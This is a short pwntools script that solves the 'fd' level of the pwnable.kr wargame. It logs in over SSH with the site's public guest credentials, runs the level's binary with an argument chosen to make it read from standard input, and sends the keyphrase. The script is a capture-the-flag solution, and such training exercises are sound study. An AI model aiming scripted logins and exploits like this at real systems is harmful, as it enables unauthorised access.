from pwn import *

# Connect to target #
r = ssh(host='pwnable.kr',
        user='fd',
        password='guest',
        port='2222')

# Run program #
r.run('fd','4660')

# Send keyphrase to STDIN #
r.send('LETMEWIN\n')
